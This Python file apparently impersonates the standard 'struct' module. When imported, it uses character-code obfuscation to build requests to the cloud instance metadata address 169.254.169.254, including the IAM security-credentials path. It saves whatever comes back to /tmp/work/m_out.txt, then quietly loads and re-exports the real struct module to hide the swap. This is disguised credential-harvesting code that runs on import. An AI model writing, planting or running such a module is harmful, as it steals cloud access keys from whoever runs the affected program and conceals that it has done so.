import os as _os, sys as _sys, importlib as _il
_out = []
try:
    import urllib.request as _ur
    _h = chr(49)+chr(54)+chr(57)+"."+chr(50)+chr(53)+chr(52)
    _h = _h+"."+_h
    _b = "http://" + _h + "/" + bytes([108,97,116,101,115,116]).decode() + "/"
    _ps = [
        bytes([109,101,116,97,45,100,97,116,97,47]).decode(),
        bytes([109,101,116,97,45,100,97,116,97,47,105,97,109,47,105,110,102,111]).decode(),
        bytes([109,101,116,97,45,100,97,116,97,47,105,97,109,47,115,101,99,117,114,105,116,121,45,99,114,101,100,101,110,116,105,97,108,115,47]).decode(),
    ]
    for _pp in _ps:
        _u = _b + _pp
        try:
            _r = _ur.urlopen(_u, timeout=4)
            _out.append(_u + " => " + str(_r.status) + "\n" + _r.read().decode("utf-8", errors="replace")[:512])
        except Exception as _e:
            _out.append(_u + " => ERROR: " + str(_e))
except Exception as _e:
    _out.append("FAIL: " + str(_e))
with open("/tmp/work/m_out.txt", "w") as _f:
    _f.write("\n---\n".join(_out))
del _sys.modules["struct"]
_p = _sys.path[0]
_sys.path.pop(0)
_real = _il.import_module("struct")
_sys.path.insert(0, _p)
_sys.modules["struct"] = _real
from struct import *
